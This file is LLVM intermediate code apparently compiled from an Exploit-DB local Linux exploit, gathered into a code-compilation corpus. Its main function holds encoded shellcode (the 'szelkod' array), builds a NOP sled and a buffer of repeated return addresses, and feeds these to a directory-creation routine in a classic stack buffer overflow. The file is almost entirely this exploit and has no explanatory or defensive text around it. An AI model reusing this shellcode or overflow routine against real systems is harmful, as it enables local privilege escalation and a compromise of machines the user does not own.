; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19485.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19485.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZE = common dso_local global i32 0, align 4
@__const.main.szelkod = private unnamed_addr constant [161 x i8] c"\EB\03^\EB\05\E8\F8\FF\FF\FF\83\C6\0D1\C9\B1\88\806\01F\E2\FA\EA\19.cho.bilne\015644\01.cho.ri\01\88\F7T\88\E4\82\ED\19VWR\E9\01\01\01\01Z\80\C2\CF\11\01\01\8C\BA\0B\EE\FE\FE\88|\F1\8C\82\14\EE\FE\FE\88D\F5\8C\92\1B\EE\FE\FE\88T\F9\C6D\FD\01\01\01\01\B9G\01\01\010\F70\C8R\88\F2\CC\81\8CD\F1\88\C0\B9\0A\01\01\01\88\FF0\D3R\88\F2\CC\81\8Cd\DDZ_^\C8\C2\91\91\91\91\91\91\91\91\91\91\91\91\00\00", align 16
@.str = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@S_IRWXU = common dso_local global i32 0, align 4
@S_IRWXG = common dso_local global i32 0, align 4
@S_IRWXO = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"mkdir()\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"chdir()\00", align 1
@NOP = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [10 x i8] c"makedir()\00", align 1
@ALIGN = common dso_local global i64 0, align 8
@RET = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca [10 x i8], align 1
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i8*, align 8
  %8 = alloca [161 x i8], align 16
  %9 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %3, align 4
  %10 = load i32, i32* @BUFSIZE, align 4
  %11 = zext i32 %10 to i64
  %12 = call i8* @llvm.stacksave()
  store i8* %12, i8** %5, align 8
  %13 = alloca i8, i64 %11, align 16
  store i64 %11, i64* %6, align 8
  store i8* null, i8** %7, align 8
  %14 = bitcast [161 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %14, i8* align 16 getelementptr inbounds ([161 x i8], [161 x i8]* @__const.main.szelkod, i32 0, i32 0), i64 161, i1 false)
  %15 = getelementptr inbounds [10 x i8], [10 x i8]* %4, i64 0, i64 0
  %16 = call i32 (...) @getpid()
  %17 = call i32 @sprintf(i8* %15, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i32 %16)
  %18 = getelementptr inbounds [10 x i8], [10 x i8]* %4, i64 0, i64 0
  %19 = load i32, i32* @S_IRWXU, align 4
  %20 = load i32, i32* @S_IRWXG, align 4
  %21 = or i32 %19, %20
  %22 = load i32, i32* @S_IRWXO, align 4
  %23 = or i32 %21, %22
  %24 = call i64 @mkdir(i8* %18, i32 %23)
  %25 = icmp ne i64 %24, 0
  br i1 %25, label %26, label %28

26:                                               ; preds = %0
  %27 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  store i32 1, i32* %9, align 4
  br label %119

28:                                               ; preds = %0
  %29 = getelementptr inbounds [10 x i8], [10 x i8]* %4, i64 0, i64 0
  %30 = call i64 @chdir(i8* %29)
  %31 = icmp ne i64 %30, 0
  br i1 %31, label %32, label %34

32:                                               ; preds = %28
  %33 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  store i32 1, i32* %9, align 4
  br label %119

34:                                               ; preds = %28
  store i8* %13, i8** %7, align 8
  %35 = load i32, i32* @BUFSIZE, align 4
  %36 = getelementptr inbounds [161 x i8], [161 x i8]* %8, i64 0, i64 0
  %37 = call i32 @strlen(i8* %36)
  %38 = sub nsw i32 %35, %37
  store i32 %38, i32* %3, align 4
  store i32 0, i32* %2, align 4
  br label %39

39:                                               ; preds = %48, %34
  %40 = load i32, i32* %2, align 4
  %41 = load i32, i32* %3, align 4
  %42 = icmp slt i32 %40, %41
  br i1 %42, label %43, label %51

43:                                               ; preds = %39
  %44 = load i32, i32* @NOP, align 4
  %45 = trunc i32 %44 to i8
  %46 = load i8*, i8** %7, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %7, align 8
  store i8 %45, i8* %46, align 1
  br label %48

48:                                               ; preds = %43
  %49 = load i32, i32* %2, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %2, align 4
  br label %39

51:                                               ; preds = %39
  %52 = load i32, i32* %3, align 4
  %53 = load i8*, i8** %7, align 8
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = add nsw i32 %55, %52
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %53, align 1
  store i32 0, i32* %2, align 4
  br label %58

58:                                               ; preds = %70, %51
  %59 = load i32, i32* %2, align 4
  %60 = getelementptr inbounds [161 x i8], [161 x i8]* %8, i64 0, i64 0
  %61 = call i32 @strlen(i8* %60)
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %73

63:                                               ; preds = %58
  %64 = load i32, i32* %2, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [161 x i8], [161 x i8]* %8, i64 0, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = load i8*, i8** %7, align 8
  %69 = getelementptr inbounds i8, i8* %68, i32 1
  store i8* %69, i8** %7, align 8
  store i8 %67, i8* %68, align 1
  br label %70

70:                                               ; preds = %63
  %71 = load i32, i32* %2, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %2, align 4
  br label %58

73:                                               ; preds = %58
  %74 = load i8*, i8** %7, align 8
  store i8 0, i8* %74, align 1
  %75 = call i64 @makedir(i8* %13)
  %76 = icmp slt i64 %75, 0
  br i1 %76, label %77, label %79

77:                                               ; preds = %73
  %78 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  store i32 1, i32* %9, align 4
  br label %119

79:                                               ; preds = %73
  %80 = load i32, i32* @BUFSIZE, align 4
  %81 = call i32 @bzero(i8* %13, i32 %80)
  %82 = load i32, i32* @NOP, align 4
  %83 = load i64, i64* @ALIGN, align 8
  %84 = add nsw i64 40, %83
  %85 = call i32 @memset(i8* %13, i32 %82, i64 %84)
  %86 = call i64 @makedir(i8* %13)
  %87 = icmp slt i64 %86, 0
  br i1 %87, label %88, label %90

88:                                               ; preds = %79
  %89 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  store i32 1, i32* %9, align 4
  br label %119

90:                                               ; preds = %79
  %91 = load i32, i32* @BUFSIZE, align 4
  %92 = call i32 @bzero(i8* %13, i32 %91)
  store i32 0, i32* %2, align 4
  br label %93

93:                                               ; preds = %102, %90
  %94 = load i32, i32* %2, align 4
  %95 = icmp slt i32 %94, 96
  br i1 %95, label %96, label %105

96:                                               ; preds = %93
  %97 = load i64, i64* @RET, align 8
  %98 = load i32, i32* %2, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %13, i64 %99
  %101 = bitcast i8* %100 to i64*
  store i64 %97, i64* %101, align 1
  br label %102

102:                                              ; preds = %96
  %103 = load i32, i32* %2, align 4
  %104 = add nsw i32 %103, 4
  store i32 %104, i32* %2, align 4
  br label %93

105:                                              ; preds = %93
  store i32 0, i32* %2, align 4
  br label %106

106:                                              ; preds = %115, %105
  %107 = load i32, i32* %2, align 4
  %108 = icmp slt i32 %107, 2
  br i1 %108, label %109, label %118

109:                                              ; preds = %106
  %110 = call i64 @makedir(i8* %13)
  %111 = icmp slt i64 %110, 0
  br i1 %111, label %112, label %114

112:                                              ; preds = %109
  %113 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  store i32 1, i32* %9, align 4
  br label %119

114:                                              ; preds = %109
  br label %115

115:                                              ; preds = %114
  %116 = load i32, i32* %2, align 4
  %117 = add nsw i32 %116, 1
  store i32 %117, i32* %2, align 4
  br label %106

118:                                              ; preds = %106
  store i32 0, i32* %1, align 4
  store i32 1, i32* %9, align 4
  br label %119

119:                                              ; preds = %118, %112, %88, %77, %32, %26
  %120 = load i8*, i8** %5, align 8
  call void @llvm.stackrestore(i8* %120)
  %121 = load i32, i32* %1, align 4
  ret i32 %121
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @sprintf(i8*, i8*, i32) #3

declare dso_local i32 @getpid(...) #3

declare dso_local i64 @mkdir(i8*, i32) #3

declare dso_local i32 @perror(i8*) #3

declare dso_local i64 @chdir(i8*) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i64 @makedir(i8*) #3

declare dso_local i32 @bzero(i8*, i32) #3

declare dso_local i32 @memset(i8*, i32, i64) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
